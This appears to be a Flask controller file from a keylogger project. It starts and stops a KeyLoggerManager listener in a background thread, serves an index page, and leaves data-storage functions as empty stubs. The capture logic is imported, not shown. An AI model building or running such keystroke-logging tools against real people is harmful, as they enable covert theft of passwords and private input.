from flask import send_from_directory , request,jsonify
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from KeyloggerAgent.KeyloggerManager import KeyLoggerManager
import threading

keylogger = KeyLoggerManager()
keylogger_thread = None



def start_listening():
    global keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger_thread = threading.Thread(target=keylogger.start_listening, daemon=True)
        keylogger_thread.start()
        return jsonify({"message": "Keylogger started!"})
    return jsonify({"message": "Keylogger is already running!"})

def stop_listening():
    keylogger.stop_listening()
    return jsonify({"message": "Keylogger stopped!"})

def index_page():
    return send_from_directory("../front", "index.html")


def get_data():
   pass

def get_users():
    pass

def store_data():
    pass

def handle_url_params():
    param = request.args.get("param", "default_value")
    return {"param_received": param}
